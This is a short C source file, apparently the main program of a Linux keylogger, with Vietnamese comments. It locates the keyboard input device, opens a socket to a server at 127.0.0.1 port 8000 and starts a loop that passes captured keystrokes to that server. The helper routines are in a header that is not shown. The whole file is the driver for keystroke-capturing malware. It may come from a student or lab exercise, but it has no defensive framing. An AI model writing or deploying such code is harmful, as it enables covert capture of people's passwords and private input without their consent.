#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include "keyLogger.h"

int main(int argc, char *argv[])
{
    int keyboard;
    int server;

    // Tim thiet bi ban phim
    if (!keyboardFound(DEVICES_PATH, &keyboard))
    {
        fprintf(stderr, "[-] Keyboard not found\n");
        return 1;
    }

    printf("[+] Keyboard found (fd=%d)\n", keyboard);

    // Connect tới server js
    server = openConnectionWithServer("127.0.0.1", 8000);
    if (server <= 0)
    {
        fprintf(stderr, "[-] Cannot connect to server\n");
        close(keyboard);
        return 1;
    }

    printf("[+] Connected to server (fd=%d)\n", server);

    // Bat dau keylogger
    startKeylogger(keyboard, server);

    // Khong bao gio toi day tru khi thoat
    printf("[*] Keylogger stopped\n");
    return 0;
}